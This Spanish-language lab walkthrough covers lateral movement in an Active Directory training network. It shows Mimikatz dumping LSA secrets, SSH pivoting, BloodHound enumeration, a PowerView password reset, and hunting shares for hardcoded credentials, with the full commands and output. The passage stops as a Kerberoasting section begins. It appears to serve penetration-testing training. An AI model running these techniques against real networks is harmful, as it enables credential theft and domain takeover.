
# Movimiento lateral

## <mark style="color:purple;">Esquema de pivoting</mark>

Tenemos el siguiente esquema de red que podemos usar para tener claro la visión de la red:

<figure><img src="/files/VLTJRSR9LkGlTisecrnZ" alt=""><figcaption></figcaption></figure>

Después de lootear el host `DEV01`, encontramos el siguiente conjunto de credenciales al volcar los LSA Secrets:

```
hporter:Gr8hambino!
```

### Método alternativo para conseguir credenciales

Si no hubiéramos conseguido por lo que sea las credenciales de `hporter` podríamos haber enumerado el usuario igualmente desde la sesión de Meterpreter:

```powershell
PS C:\users> ls

    Directory: C:\users

Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----         6/1/2022  12:03 PM                .NET v2.0                                                             
d-----         6/1/2022  12:03 PM                .NET v2.0 Classic                                                     
d-----         6/1/2022  12:03 PM                .NET v4.5                                                             
d-----         6/1/2022  12:03 PM                .NET v4.5 Classic                                                     
d-----         6/1/2022   1:03 PM                Administrator                                                         
d-----         6/1/2022  12:03 PM                Classic .NET AppPool                                                  
d-----         6/1/2022  11:28 PM                hporter                                                               
d-----         6/1/2022  12:54 PM                mpalledorous                                                          
d-r---       12/14/2020   6:30 PM                Public    
```

Y desde aquí cargar Mimikatz para extraer credenciales:

{% embed url="<https://github.com/afsh4ck/AD-Tools>" %}

```powershell
meterpreter > cd Users\\hporter\\

meterpreter > upload /home/kali/Escritorio/hack-tools/Windows/AD-Tools/mimikatz.exe
[*] Uploading  : /home/kali/Escritorio/hack-tools/Windows/AD-Tools/mimikatz.exe -> mimikatz.exe
[*] Uploaded 1.29 MiB of 1.29 MiB (100.0%): /home/kali/Escritorio/hack-tools/Windows/AD-Tools/mimikatz.exe -> mimikatz.exe
[*] Completed  : /home/kali/Escritorio/hack-tools/Windows/AD-Tools/mimikatz.exe -> mimikatz.exe
```

```powershell
meterpreter > shell
Process 3220 created.
Channel 5 created.
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

c:\Users\hporter>mimikatz.exe
mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # token::elevate
Token Id  : 0
User name : 
SID name  : NT AUTHORITY\SYSTEM

564	{0;000003e7} 1 D 34603     	NT AUTHORITY\SYSTEM	S-1-5-18	(04g,21p)	Primary
 -> Impersonated !
 * Process Token : {0;000003e7} 0 D 1352266   	NT AUTHORITY\SYSTEM	S-1-5-18	(04g,31p)	Primary
 * Thread Token  : {0;000003e7} 1 D 1393202   	NT AUTHORITY\SYSTEM	S-1-5-18	(04g,21p)	Impersonation (Delegation)

mimikatz # lsadump::secrets
Domain : ACADEMY-AEN-DEV
SysKey : b3a720652a6fca7e31c1659e3d619944

Local name : ACADEMY-AEN-DEV ( S-1-5-21-4188713075-3040141756-4070027797 )
Domain name : INLANEFREIGHT ( S-1-5-21-2814148634-3729814499-1637837074 )
Domain FQDN : INLANEFREIGHT.LOCAL

Policy subsystem is : 1.18
LSA Key(s) : 1, default {b9789de7-ed68-1526-12f5-08fc1ad2996f}
  [00] {b9789de7-ed68-1526-12f5-08fc1ad2996f} c382f753c97d2798f34aa2c43c41ca6fdc8548a17eba53764e79a20550fed730

Secret  : $MACHINE.ACC
cur/hex : b3 1b 50 8d a2 5a 92 93 0f ae dd ad aa 77 91 46 56 72 4e 8e a2 08 ac 1c eb 3c 69 a0 8c 2b aa d6 a3 4b d4 e4 b2 db 83 db de aa 60 9e a5 92 c9 57 09 6f e5 0a 4a 55 63 47 42 10 f6 9f d7 43 85 92 a7 87 fa 49 d4 03 3f d8 e7 31 e2 8a 9e 5c a5 7c ce dd 9d 9f 64 0d 13 8e 52 b0 9a c1 3a 97 3d d4 d1 92 32 a5 65 6d 4c 6f a5 dd 56 03 d7 04 46 2c c8 a3 0a 27 6c 32 1f e3 fc 62 83 7d ca b9 9f ed c9 12 26 e4 22 45 a6 09 e5 69 9e 5a ed 05 05 04 75 d2 2d c1 1d 20 62 db f9 38 4a cd 10 7f 26 cb b5 3a 43 dc bd 00 11 b6 83 3e 12 bc e8 8a 0f fa 63 b4 5c ed 01 90 62 0f e5 1b dc d9 5d 78 a7 cf 2c ee 53 72 24 d5 ce d9 0a 9f c7 68 5f 37 1e 8e 9c a6 b2 d2 83 21 32 43 23 4d 76 8f 00 11 85 bd 3d 09 e1 39 dd e0 c2 c5 fe a1 be be b8 e5 f2 d9 
    NTLM:9fec886f5c1d994887e6f890e5b91ac4
    SHA1:e8bc7f0d94655e9311d962b04099de186c9090b1
old/text: >& FZ0F!KFq.+MBPHE.l(xyXD;Pay3n*GAY n-9Y;5>w]_KI@QNbWDtk^u@Ia]`ac$f3<a+`93`jbVn>!vJ!4I;!$]Mg!QK.Or)'Lr0Vv'OU;UdaJiu2hT3l
    NTLM:cb8a6327fc3dad4ea7c84b88c7542e7c
    SHA1:7a235e5ec5d545d163d6c181383d3f043d4685c2

Secret  : DefaultPassword
cur/text: Gr8hambino!
```

Dado que tenemos persistencia en `DEV01` podemos usarlo como punto de partida para lanzar nuevos ataques.

#### Configurar pivoting

{% hint style="warning" %}
Debemos hacer el reenvío del puerto `3389 (RDP)` del objetivo a un puerto que elijamos, cómo el `13389`
{% endhint %}

```shell-session
afsh4ck@kali$  ssh -i dmz01_key -L 13389:172.16.8.20:3389 root@10.129.229.147
```

#### Conexión por RDP

Usamos `/drive:home,"/home/kali/Escritorio/hack-tools/Windows`para transferir archivos cómodamente entre las máquinas por RDP:

```bash
xfreerdp /v:127.0.0.1:13389 /u:hporter /p:Gr8hambino! /drive:home,"/home/kali/Escritorio/hack-tools/Windows/AD-Tools"
```

<figure><img src="/files/i5tt5GKFMCpSMWXQFCvP" alt=""><figcaption></figcaption></figure>

## <mark style="color:purple;">Análisis con Bloodhound</mark>

{% content-ref url="/pages/TEIs7wP6Kqu4uwenlqgM" %}
[BloodHound](/ethical-hacking-cheatsheet/active-directory/active-directory/bloodhound.md)
{% endcontent-ref %}

Usaremos el recopilador [SharpHound](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors) para enumerar todos los objetos de AD posibles y luego ingerir los datos en la interfaz gráfica de BloodHound para su revisión. Podemos descargar el ejecutable (aunque en una evaluación real, es mejor compilar nuestras propias herramientas) y usar el práctico administrador de archivos DNN para subirlo al objetivo. Queremos recopilar la mayor cantidad de datos posible y no tenemos que preocuparnos por la evasión, así que usaremos la flag `-c All` para usar todos los métodos de recopilación.

### Sharphound.exe

Podemos escribir `net use` para ver la ubicación de nuestra unidad redirigida y luego transferir la herramienta.

{% hint style="warning" %}
También podríamos subir `sharphound.exe` a través del File Manager que descubrimos, lo cual es muy práctico.
{% endhint %}

```powershell
PS C:\Users\hporter> net use
New connections will be remembered.

Status       Local     Remote                    Network
-------------------------------------------------------------------------------
                       \\TSCLIENT\home           Microsoft Terminal Services
The command completed successfully.

PS c:\DotNetNuke\Portals\0> copy \\TSCLIENT\home\SharpHound.exe .
        1 file(s) copied.

PS C:\DotNetNuke\Portals\0> .\SharpHound.exe -c All

2025-04-24T12:43:38.0860265-07:00|INFORMATION|This version of SharpHound is compatible with the 5.0.0 Release of BloodHound
2025-04-24T12:43:38.2422538-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote, UserRights, CARegistry, DCRegistry, CertServices, LdapServices, WebClientService, SmbInfo, NTLMRegistry
2025-04-24T12:43:38.3047304-07:00|INFORMATION|Initializing SharpHound at 12:43 PM on 4/24/2025
2025-04-24T12:43:38.5703661-07:00|INFORMATION|Loaded cache with stats: 0 ID to type mappings.
 0 name to SID mappings.
 0 machine sid mappings.
 0 sid to domain mappings.
 0 global catalog mappings.
2025-04-24T12:43:38.5859843-07:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote, UserRights, CARegistry, DCRegistry, CertServices, LdapServices, WebClientService, SmbInfo, NTLMRegistry
```

### Desde Meterpreter

Podríamos cargar Sharphound igualmente desde una sesión de Meterpreter abierta:

```powershell
meterpreter > pwd
c:\DotNetNuke\Portals\0

meterpreter > upload /home/kali/Escritorio/hack-tools/Windows/Bloodhound/sharphound/SharpHound.exe
[*] Uploading  : /home/kali/Escritorio/hack-tools/Windows/Bloodhound/sharphound/SharpHound.exe -> SharpHound.exe
[*] Uploaded 1.25 MiB of 1.25 MiB (100.0%): /home/kali/Escritorio/hack-tools/Windows/Bloodhound/sharphound/SharpHound.exe -> SharpHound.exe
[*] Completed  : /home/kali/Escritorio/hack-tools/Windows/Bloodhound/sharphound/SharpHound.exe -> SharpHound.exe
```

Y lo ejecutamos desde una shell:

```powershell
c:\DotNetNuke\Portals\0>SharpHound.exe

2025-10-09T11:07:51.2644182-07:00|INFORMATION|This version of SharpHound is compatible with the 5.0.0 Release of BloodHound
2025-10-09T11:07:51.4362904-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote, CertServices, LdapServices, WebClientService, SmbInfo
2025-10-09T11:07:51.4832783-07:00|INFORMATION|Initializing SharpHound at 11:07 AM on 10/9/2025
2025-10-09T11:07:51.8738042-07:00|INFORMATION|Resolved current domain to INLANEFREIGHT.LOCAL
2025-10-09T11:07:52.0925470-07:00|INFORMATION|Flags: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote, CertServices, LdapServices, WebClientService, SmbInfo
2025-10-09T11:07:52.2019232-07:00|INFORMATION|Beginning LDAP search for INLANEFREIGHT.LOCAL
2025-10-09T11:07:52.5769221-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for INLANEFREIGHT.LOCAL
<---SNIP--->
2025-10-09T11:08:13.3269020-07:00|INFORMATION|Status: 3843 objects finished (+3843 183)/s -- Using 71 MB RAM
2025-10-09T11:08:13.3269020-07:00|INFORMATION|Enumeration finished in 00:00:21.1380884
2025-10-09T11:08:13.6862814-07:00|INFORMATION|Saving cache with stats: 20 ID to type mappings.
 1 name to SID mappings.
 2 machine sid mappings.
 2 sid to domain mappings.
 0 global catalog mappings.
2025-10-09T11:08:13.7175262-07:00|INFORMATION|SharpHound Enumeration Completed at 11:08 AM on 10/9/2025! Happy Graphing!
```

#### ZIP generado

```powershell
PS c:\DotNetNuke\Portals\0> dir
 Volume in drive C has no label.
 Volume Serial Number is DA7F-3F25

 Directory of c:\DotNetNuke\Portals\0

Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----         6/1/2022   1:49 PM                Images                                                                
d-----         6/1/2022   1:49 PM                Templates                                                             
d-----         6/1/2022   1:51 PM                Users                                                                 
-a----        10/9/2025  11:08 AM         267160 20251009110753_BloodHound.zip  
...
```

Esto generará un archivo Zip que podremos descargar de nuevo mediante la herramienta de gestión de archivos DNN o copiarla a nuestro Kali de la siguiente manera:

```powershell
PS C:\DotNetNuke\Portals\0> copy 20250424124339_data.zip \\Tsclient\Home
```

También nos lo podríamos descargar desde el File Management de DNN, mucho más práctico:

<figure><img src="/files/mrtHeo23WoKtCOeNNgeQ" alt=""><figcaption></figcaption></figure>

Buscando nuestro usuario `hporter` y seleccionando `First Degree Object Control`, podremos ver que el usuario tiene derechos `ForceChangePassword` sobre el usuario `ssmalls`.

<figure><img src="/files/XoPoD3dBk2yqd7Bdwp56" alt=""><figcaption></figcaption></figure>

Como apunte, podemos ver que todos los usuarios del dominio tienen acceso RDP al host `DEV01`. Esto significa que cualquier usuario del dominio puede acceder mediante RDP y, si escala privilegios, podría robar datos confidenciales como credenciales. Este hallazgo es importante; podemos calificarlo como `Excessive Active Directory Group Privileges` de riesgo medio. Si todo el grupo tuviera derechos de administrador local sobre un host, sin duda sería un hallazgo de alto riesgo.

<figure><img src="/files/0vY0H6W488AwjUzSH9yM" alt=""><figcaption></figcaption></figure>

Podemos usar [PowerView](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1) para cambiar la contraseña del usuario `ssmalls`. Nos conectamos al destino mediante RDP tras comprobar que el puerto esté abierto. RDP nos facilitará la interacción con el dominio mediante una consola de PowerShell, aunque también podríamos hacerlo mediante nuestro acceso de reverse shell.

```shell-session
afsh4ck@kali$ proxychains nmap -sT -p 3389 172.16.8.20

ProxyChains-3.1 (http://proxychains.sf.net)
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-22 13:35 EDT
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.20:80-<><>-OK
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.20:3389-<><>-OK
Nmap scan report for 172.16.8.20
Host is up (0.11s latency).

PORT     STATE SERVICE
3389/tcp open  ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned in 0.30 seconds 
```

Para lograr esto, podemos usar otro comando de Port Forwarding SSH, de tipo `Local Port Forwarding`. Este comando nos permite enviar todo el tráfico RDP del host `DEV01` al host `dmz01` a través del puerto local `13389`.

```bash
ssh -i dmz01_key -L 13389:172.16.8.20:3389 root@10.129.203.111
```

Una vez configurado este Port Forwarding, podemos usar `xfreerdp` para conectarnos al host mediante la redirección de unidad para transferir archivos de ida y vuelta fácilmente.

{% embed url="<https://github.com/afsh4ck/AD-Tools>" %}

```bash
xfreerdp /v:127.0.0.1:13389 /u:hporter /p:Gr8hambino! /drive:home,"/home/kali/Escritorio/hack-tools/Windows/AD-Tools"
```

{% hint style="warning" %}
Cambiar la ruta donde se encuentran las herramientas de enumeración / explotación de Windows en nuestro equipo de atacante, en mi caso "`/home/kali/Escritorio/hack-tools/Windows/AD-Tools`"
{% endhint %}

Observamos que solo tenemos acceso a la consola, ya que este servidor no tiene instalado el rol de Experiencia de Escritorio, pero solo necesitamos una consola.

<figure><img src="/files/7tgCRXmWaxySAOrYOD7P" alt=""><figcaption></figcaption></figure>

```powershell
c:\DotNetNuke\Portals\0> copy \\TSCLIENT\home\PowerView.ps1 .
        1 file(s) copied.
```

A continuación, escribimos `powershell` para colocarnos en una consola de PowerShell y podremos usar `PowerView` para cambiar la contraseña del usuario `ssmalls` de la siguiente manera:

```powershell
PS C:\DotNetNuke\Portals\0> Import-Module .\PowerView.ps1

PS C:\DotNetNuke\Portals\0> Set-DomainUserPassword -Identity ssmalls -AccountPassword (ConvertTo-SecureString 'Str0ngpass86!' -AsPlainText -Force ) -Verbose

VERBOSE: [Set-DomainUserPassword] Attempting to set the password for user 'ssmalls'
VERBOSE: [Set-DomainUserPassword] Password for user 'ssmalls' successfully reset
```

Podemos volver a nuestro host de ataque y confirmar que la contraseña se cambió correctamente. Generalmente, queremos evitar este tipo de actividad durante una prueba de penetración, pero si es nuestra única opción, debemos confirmarlo con nuestro cliente. La mayoría nos pedirá que procedamos para ver hasta dónde llegamos, pero siempre es mejor preguntar.&#x20;

{% hint style="warning" %}
Por supuesto, queremos anotar cualquier cambio como este en nuestro registro de actividad para poder incluirlo en un apéndice de nuestro informe.
{% endhint %}

```shell-session
afsh4ck@kali$ proxychains crackmapexec smb 172.16.8.3 -u ssmalls -p Str0ngpass86!

ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:445-<><>-OK
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:445-<><>-OK
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:135-<><>-OK
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:445-<><>-OK
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:445-<><>-OK
SMB         172.16.8.3      445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:445-<><>-OK
SMB         172.16.8.3      445    DC01             [+] INLANEFREIGHT.LOCAL\ssmalls:Str0ngpass86!
```

***

## <mark style="color:purple;">Share Hunting</mark>

Tras investigar un poco más el host y el AD, no encontramos nada útil. BloodHound no muestra nada interesante para el usuario `ssmalls`. Tanto la sección "[Enumeración con credenciales desde Windows](/ethical-hacking-cheatsheet/active-directory/active-directory/enumeracion-en-ad/ad-enumeracion-con-credenciales-desde-windows.md)" como la sección "[Enumeración con credenciales desde Linux](/ethical-hacking-cheatsheet/active-directory/active-directory/enumeracion-en-ad/ad-enumeracion-con-credenciales-desde-linux.md)" abordaron la búsqueda de recursos compartidos de archivos con Snaffler y CrackMapExec, respectivamente.&#x20;

En numerosas ocasiones, durante las pruebas de penetración, he tenido que recurrir a la búsqueda de recursos compartidos de archivos para encontrar información, como la contraseña de una cuenta de servicio o similar. A menudo he podido acceder a recursos compartidos departamentales (como TI) con credenciales con pocos privilegios debido a permisos NTFS débiles. En ocasiones, incluso he podido acceder a recursos compartidos de algunos o todos los usuarios de la empresa objetivo debido al mismo problema.&#x20;

Con frecuencia, los usuarios desconocen que su unidad de disco personal es un recurso compartido de red asignado y no una carpeta local en su ordenador, por lo que pueden guardar allí todo tipo de datos confidenciales. Los permisos de los recursos compartidos de archivos son muy difíciles de mantener, especialmente en grandes organizaciones. A menudo, durante las pruebas de penetración, he tenido que buscar en recursos compartidos de archivos cuando me he quedado atascado. Recuerdo una prueba de penetración específica en la que tenía credenciales de usuario, pero me quedé atascado durante unos días y tuve que revisar recursos compartidos. Después de un tiempo, encontré un `web.config`archivo con credenciales válidas para una cuenta de servicio MSSQL. Esto me otorgó permisos de administrador local en un servidor SQL donde un administrador de dominio había iniciado sesión, y se acabó el juego.&#x20;

En otras ocasiones, he encontrado archivos con contraseñas en unidades de usuario que me han ayudado a avanzar. Dependiendo de la organización y de cómo estén configurados sus permisos de archivo, puede haber mucho que analizar y mucho "ruido". Una herramienta como Snaffler puede ayudarnos a gestionarlo y a centrarnos en los archivos y scripts más importantes. Probémoslo.

Primero, ejecutemos [Snaffler](https://github.com/SnaffCon/Snaffler) desde nuestra sesión RDP como el usuario `hporter`.

```cmd-session
c:\DotNetNuke\Portals\0> copy \\TSCLIENT\home\Snaffler.exe
        1 file(s) copied.

c:\DotNetNuke\Portals\0> Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data
 .::::::.:::.    :::.  :::.    .-:::::'.-:::::':::    .,:::::: :::::::..
;;;`    ``;;;;,  `;;;  ;;`;;   ;;;'''' ;;;'''' ;;;    ;;;;'''' ;;;;``;;;;
'[==/[[[[, [[[[[. '[[ ,[[ '[[, [[[,,== [[[,,== [[[     [[cccc   [[[,/[[['
  '''    $ $$$ 'Y$c$$c$$$cc$$$c`$$$'`` `$$$'`` $$'     $$""   $$$$$$c
 88b    dP 888    Y88 888   888,888     888   o88oo,.__888oo,__ 888b '88bo,
  'YMmMY'  MMM     YM YMM   ''` 'MM,    'MM,  ''''YUMMM''''YUMMMMMMM   'W'
                         by l0ss and Sh3r4 - github.com/SnaffCon/Snaffler


2022-06-22 10:57:33 -07:00 [Share] {Green}(\\DC01.INLANEFREIGHT.LOCAL\Department Shares)
2022-06-22 10:57:36 -07:00 [Share] {Black}(\\ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL\ADMIN$)
2022-06-22 10:57:36 -07:00 [Share] {Black}(\\ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL\C$)
Press any key to exit.
```

Esto no revela nada interesante, así que volvamos a ejecutar nuestra enumeración de recursos compartidos como el usuario `ssmalls`. Los usuarios suelen tener diferentes permisos, por lo que la enumeración de recursos compartidos debe considerarse un proceso iterativo. Para evitar tener que volver a usar RDP, podemos usar el módulo de `CrackMapExec` [spider\_plus](https://mpgn.gitbook.io/crackmapexec/smb-protocol/spidering-shares) para explorar.

{% hint style="warning" %}
Si esto falla probar a ejecutarlo varias veces
{% endhint %}

```shell-session
afsh4ck@kali$ proxychains crackmapexec smb 172.16.8.3 -u ssmalls -p Str0ngpass86! -M spider_plus --share 'Department Shares'

ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:445-<><>-OK
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:445-<><>-OK
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:135-<><>-OK
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:445-<><>-OK
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:445-<><>-OK
SMB         172.16.8.3      445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:445-<><>-OK
SMB         172.16.8.3      445    DC01             [+] INLANEFREIGHT.LOCAL\ssmalls:Str0ngpass86! 
SPIDER_P... 172.16.8.3      445    DC01             [*] Started spidering plus with option:
SPIDER_P... 172.16.8.3      445    DC01             [*]        DIR: ['print$']
SPIDER_P... 172.16.8.3      445    DC01             [*]        EXT: ['ico', 'lnk']
SPIDER_P... 172.16.8.3      445    DC01             [*]       SIZE: 51200
SPIDER_P... 172.16.8.3      445    DC01             [*]     OUTPUT: /tmp/cme_spider_plus
```

Esto crea un archivo para nosotros en nuestro directorio `/tmp`, así que veámoslo.

```shell-session
afsh4ck@kali$ cat 172.16.8.3.json 
{
    "Department Shares": {
        "IT/Private/Development/SQL Express Backup.ps1": {
            "atime_epoch": "2022-06-01 14:34:16",
            "ctime_epoch": "2022-06-01 14:34:16",
            "mtime_epoch": "2022-06-01 14:35:16",
            "size": "3.91 KB"
        }
    },
    "IPC$": {
        "323a2fd620dcf3e3": {
            "atime_epoch": "1600-12-31 19:03:58",
            "ctime_epoch": "1600-12-31 19:03:58",
            "mtime_epoch": "1600-12-31 19:03:58",
            "size": "3 Bytes"
<SNIP>
```

El archivo `SQL Express Backup.ps1` en el recurso compartido `IT/Private/Development` parece muy interesante. Vamos a descargarlo usando `smbclient`. Primero, necesitamos conectarnos.

```shell-session
afsh4ck@kali$ proxychains smbclient -U ssmalls '//172.16.8.3/Department Shares' 

ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:445-<><>-OK
Enter WORKGROUP\ssmalls's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jun  1 14:34:06 2022
  ..                                  D        0  Wed Jun  1 14:34:06 2022
  Accounting                          D        0  Wed Jun  1 14:34:08 2022
  Executives                          D        0  Wed Jun  1 14:34:04 2022
  Finance                             D        0  Wed Jun  1 14:34:00 2022
  HR                                  D        0  Wed Jun  1 14:33:48 2022
  IT                                  D        0  Wed Jun  1 14:33:42 2022
  Marketing                           D        0  Wed Jun  1 14:33:56 2022
  R&D                                 D        0  Wed Jun  1 14:33:52 2022

		10328063 blocks of size 4096. 8177952 blocks available
```

Luego podemos navegar hasta el recurso compartido `Development`.

```bash
smb: \IT\Private\> cd Development\
smb: \IT\Private\Development\> ls
  .                                   D        0  Wed Jun  1 14:34:17 2022
  ..                                  D        0  Wed Jun  1 14:34:17 2022
  SQL Express Backup.ps1              A     4001  Wed Jun  1 14:34:15 2022

		10328063 blocks of size 4096. 8177952 blocks available
smb: \IT\Private\Development\> get SQL Express Backup.ps1 
NT_STATUS_OBJECT_NAME_NOT_FOUND opening remote file \IT\Private\Development\SQL

smb: \IT\Private\Development\> get "SQL Express Backup.ps1" 
getting file \IT\Private\Development\SQL Express Backup.ps1 of size 4001 as SQL Express Backup.ps1 (8.7 KiloBytes/sec) (average 8.7 KiloBytes/sec)
```

Al revisar el archivo, vemos que se trata de una especie de script de backup con credenciales codificadas para `backupadm`, otra contraseña de acceso directo al teclado. Observo una tendencia en esta organización. Quizás el mismo administrador la configuró como la contraseña que usamos antes por fuerza bruta con `Hydra`, ya que esto está relacionado con el desarrollo.

```powershell
afsh4ck@kali$ cat SQL\ Express\ Backup.ps1 

$serverName = ".\SQLExpress"
$backupDirectory = "D:\backupSQL"
$daysToStoreDailyBackups = 7
$daysToStoreWeeklyBackups = 28
$monthsToStoreMonthlyBackups = 3

[System.Reflection.Assembly]::LoadWithPartialName("Microsoft.SqlServer.SMO") | Out-Null
[System.Reflection.Assembly]::LoadWithPartialName("Microsoft.SqlServer.SmoExtended") | Out-Null
[System.Reflection.Assembly]::LoadWithPartialName("Microsoft.SqlServer.ConnectionInfo") | Out-Null
[System.Reflection.Assembly]::LoadWithPartialName("Microsoft.SqlServer.SmoEnum") | Out-Null
 
$mySrvConn = new-object Microsoft.SqlServer.Management.Common.ServerConnection
$mySrvConn.ServerInstance=$serverName
$mySrvConn.LoginSecure = $false
$mySrvConn.Login = "backupadm"
$mySrvConn.Password = "!qazXSW@"

<---SNIP--->
```

<figure><img src="/files/N50vmF6NICYRM76A4P1N" alt=""><figcaption></figcaption></figure>

{% hint style="warning" %}
Esta cuenta `backupadm` nos indica que es el administrador que tiene acceso a todos los backups, por lo que podremos encontrar algún backup interesante con más contraseñas.
{% endhint %}

Antes de intentar usar esta cuenta en algún lugar, investiguemos un poco más. Primero veremos todos los recursos compartidos SMB:

```bash
proxychains smbmap -H 172.16.8.3 -u ssmalls -p 'Str0ngpass86!'                                       

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

                                                                       ...  OK               
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      
                                                                                                                             
[+] IP: 172.16.8.3:445	Name: 172.16.8.3          	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	Department Shares                                 	READ ONLY	Share for department users
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share 
	SYSVOL                                            	READ ONLY	Logon server share 
[*] Closed 1 connections 
```

Hay un archivo `.vbs` interesante en el recurso compartido `SYSVOL`, al que pueden acceder todos los usuarios del dominio.

```shell-session
     },
       "INLANEFREIGHT.LOCAL/scripts/adum.vbs": {
           "atime_epoch": "2022-06-01 14:34:41",
           "ctime_epoch": "2022-06-01 14:34:41",
           "mtime_epoch": "2022-06-01 14:34:39",
           "size": "32.15 KB"
```

Podemos descargarlo nuevamente con `smbclient`.

```shell-session
afsh4ck@kali$ proxychains smbclient -U ssmalls '//172.16.8.3/sysvol' 

ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:445-<><>-OK
Enter WORKGROUP\ssmalls's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jun  1 14:10:57 2022
  ..                                  D        0  Wed Jun  1 14:10:57 2022
  INLANEFREIGHT.LOCAL                Dr        0  Wed Jun  1 14:10:57 2022
smb: \INLANEFREIGHT.LOCAL\> cd scripts
smb: \INLANEFREIGHT.LOCAL\scripts\> ls
  .                                   D        0  Wed Jun  1 14:34:41 2022
  ..                                  D        0  Wed Jun  1 14:34:41 2022
  adum.vbs                            A    32921  Wed Jun  1 14:34:39 2022

		10328063 blocks of size 4096. 8177920 blocks available
smb: \INLANEFREIGHT.LOCAL\scripts\> get adum.vbs 
getting file \INLANEFREIGHT.LOCAL\scripts\adum.vbs of size 32921 as adum.vbs (57.2 KiloBytes/sec) (average 57.2 KiloBytes/sec)
```

Revisando el script encontramos otro conjunto de credenciales: `account:L337^p@$$w0rD`

```shell-session
afsh4ck@kali$ cat adum.vbs 

Option Explicit

''=================================================================================================================================
''
'' Active Directory User Management script [ADUM]
''
'' Written: 2011/07/18
'' Updated: 2015.07.21

<----SNIP---->

Const cSubject = "Active Directory User Management report"	'EMAIL - SUBJECT LINE

''Most likely not needed, but if needed to pass authorization for connecting and sending emails
Const cdoUserName = "account@inlanefreight.local"	'EMAIL - USERNAME - IF AUTHENTICATION REQUIRED
Const cdoPassword = "L337^p@$$w0rD"	
```

Al revisar BloodHound, no encontramos ningún usuario `account`, así que podría ser una contraseña antigua. Según el año en los comentarios del script, es probable que lo sea. Podemos añadir esto a nuestros hallazgos sobre datos confidenciales en recursos compartidos y anotarlo en la sección de credenciales de nuestras notas del proyecto. En ocasiones, encontraremos contraseñas antiguas que aún se usan para cuentas de servicio antiguas y que podemos usar para un ataque de Password Spraying

***

## <mark style="color:purple;">Kerberosting con Powerview</mark>

Para cubrir todas las bases, verifiquemos si hay usuarios compatibles con Kerberos. Podemos hacerlo mediante Proxychains usando `GetUserSPNs.py` de Impacket o `PowerView` desde el objetivo. En nuestra sesión RDP, cargaremos `PowerView` y enumeraremos las cuentas de Service Principal Names (SPN).

```powershell
